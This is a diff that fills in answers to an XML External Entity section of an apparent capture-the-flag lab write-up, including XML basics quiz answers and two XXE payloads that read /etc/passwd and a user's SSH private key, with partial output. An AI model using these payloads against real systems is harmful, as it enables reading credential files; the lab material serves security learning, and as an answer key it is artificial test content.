@@ -115,43 +115,29 @@ Use <a href="https://crackstation.net/" target="_blank">Crackstation</a> or <a h
 # [Severity 4 XML External Entity - eXtensible Markup Language
 
 ### Full form of XML
-```
-```
-> *Answer:* 
+> *Answer:* eXtensible Markup Language
 
 ### Is it compulsory to have XML prolog in XML documents?
-```
-```
-> *Answer:* 
+> *Answer:* no
 
 ### Can we validate XML documents against a schema?
-```
-```
-> *Answer:* 
+> *Answer:* yes
 
 ### How can we specify XML version and encoding in XML document?
-```
-```
-> *Answer:* 
+> *Answer:* XML prolog
 
 
 <br><br>
 # [Severity 4] XML External Entity - DTD
 
 ### How do you define a new ELEMENT?
-```
-```
-> *Answer:* 
+> *Answer:* !ELEMENT
 
 ### How do you define a ROOT element?
-```
-```
-> *Answer:* 
+> *Answer:* !DOCTYPE
 
 ### How do you define a new ENTITY?
-```
-```
-> *Answer:* 
+> *Answer:* !ENTITY
 
 
 <br><br>
@@ -159,18 +145,25 @@ Use <a href="https://crackstation.net/" target="_blank">Crackstation</a> or <a h
 
 ### What is the name of the user in /etc/passwd
 ```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+...
+falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
 ```
-> *Answer:* 
+> *Answer:* falcon
 
 ### Where is falcon's SSH key located?
-```
-```
-> *Answer:* 
+> *Answer:* /home/falcon/.ssh/id_rsa
 
 ### What are the first 18 characters for falcon's private key
 ```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
+<root>&read;</root>
+...MIIEogIBAAKCAQEA7b...
 ```
-> *Answer:* 
+> *Answer:* MIIEogIBAAKCAQEA7b
 
 
 <br><br>
